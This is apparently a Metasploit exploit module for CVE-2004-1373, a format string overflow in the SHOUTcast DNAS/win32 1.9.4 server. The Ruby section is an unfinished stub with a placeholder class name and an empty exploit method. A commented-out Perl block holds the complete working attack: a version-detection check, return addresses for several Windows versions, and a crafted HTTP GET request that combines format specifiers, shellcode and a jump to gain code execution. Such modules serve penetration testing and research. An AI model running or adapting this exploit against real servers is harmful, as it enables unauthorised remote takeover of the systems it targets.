require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'SHOUTcast DNAS/win32 1.9.4 File Request Format String Overflow',
			'Description'    => %q{
				This module exploits a format string vulnerability in the
				Nullsoft SHOUTcast server for Windows. The vulnerability is
				triggered by requesting a file path that contains format
				string specifiers. This vulnerability was discovered by
				Tomasz Trojanowski and Damian Put.
					
			},
			'Author'         => [ 'y0@w00t-shell.net', 'mandragore@turingtest@gmail.com' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '12585'],
					[ 'CVE', '2004-1373'],
					[ 'BID', '12096'],
					[ 'MIL', '93'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 250,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'Prepend'  => "\x81\xc4\xff\xef\xff\xff\x44",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp, winnt',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Dec 23 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::shoutcast_format_win32;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'    => 'SHOUTcast DNAS/win32 1.9.4 File Request Format String Overflow',
	'Version' => '$Revision$',
	'Authors' =>
	  [
		'y0 [at] w00t-shell.net',
		'mandragore [at] turingtest [at] gmail.com',
	  ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'winnt',],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 8000],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'AutoOpts' => { 'EXITFUNC' => 'process' },
	'Payload' =>
	  {
		'Space'     => 250,
		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
		'Prepend'   => "\x81\xc4\xff\xef\xff\xff\x44",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a format string vulnerability in the 
	Nullsoft SHOUTcast server for Windows. The vulnerability is triggered
	by requesting a file path that contains format string specifiers. This
	vulnerability was discovered by Tomasz Trojanowski and Damian Put.
}),

	'Refs'  =>
	  [
		['OSVDB', '12585'],
		['CVE',   '2004-1373'],
		['BID',   '12096'],
		['MIL',   '93'],
	  ],

	'Targets' =>
	  [
		['Windows NT SP5/SP6a English',    0x776a1799 ], # ws2help.dll
		['Windows 2000 English ALL',       0x75022ac4 ], # ws2help.dll
		['Windows XP Pro SP0/SP1 English', 0x71aa32ad ], # ws2help.dll
		['Windows 2003 Server English',    0x7ffc0638 ], # PEB return
	  ],

	'Keys' => ['shoutcast'],

	'DisclosureDate' => 'Dec 23 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $getreq = "GET / HTTP/1.0\r\n\r\n";

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send($getreq);
	my $res = $s->Recv(-1, 10);
	$s->Close();

	# SHOUTcast Distributed Network Audio Server/win32 v1.9.2<BR>

	if ($res =~ m/Network Audio Server\/([^\s]+)\s+([^<]+)<BR/) {
		my ($os, $ver) = ($1, $2);

		$self->PrintLine("[*] This system is running SHOUTcast $ver running on $os");

		if ($ver =~ /v1\.([0-8]\.|9\.[0-3]$)/) {
			if ($os eq "win32") {
				$self->PrintLine("[*] Vulnerable SHOUTcast server detected");
				return $self->CheckCode('Appears');
			}
			else {
				$self->PrintLine("[*] Vulnerable SHOUTcast version, but not a Windows system");
				return $self->CheckCode('Appears');
			}
		}
	}

	$self->PrintLine("[*] This system does not appear to be vulnerable");
	return $self->CheckCode('Detected');
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $num = (1046 - length($shellcode));

	my $sploit =
	  "GET /content/%#0". $num ."x". $shellcode.
	  "\xeb\x06\x42\x42". pack('V',$target->[1]).
	  "\xe9\x2d\xff\xff\xff".
	  "%#0100x.mp3 HTTP/1.0\r\n\r\n";

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$s->Close();
	return;
}


=end


end
end	
